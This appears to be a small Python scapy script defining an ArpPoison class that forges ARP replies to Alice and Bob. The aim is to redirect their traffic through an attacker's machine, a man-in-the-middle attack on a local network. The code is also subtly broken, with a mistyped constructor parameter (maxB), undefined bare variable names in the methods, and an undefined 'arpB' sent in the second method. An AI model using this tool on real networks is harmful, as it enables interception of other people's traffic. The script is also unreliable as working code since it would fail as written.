from scapy.all import *


class ArpPoison:

    def __init__(self, macA, ipA, maxB, ipB, macM, ipM):
        self.macA = macA
        self.ipA = ipA
        self.macB = macB
        self.ipB = ipB
        self.macM = macM
        self.ipM = ipM

    # create ARP poison of Alice machine
    def arpPoisonA(self):
        arpA = Ether() / ARP()
        arpA[Ether].src = macM
        arpA[ARP].hwsrc = macM
        arpA[ARP].psrc = ipB
        arpA[ARP].hwdst = macA
        arpA[ARP].pdst = ipA
        sendp(arpA)
        print "ARP packet send to Alice"

    # create ARP poison of Bobs machine
    def arpPoisonB(self):
        arpA = Ether() / ARP()
        arpA[Ether].src = macM
        arpA[ARP].hwsrc = macM
        arpA[ARP].psrc = ipA
        arpA[ARP].hwdst = macB
        arpA[ARP].pdst = ipB
        sendp(arpB)
        print "ARP packet send to Bob"
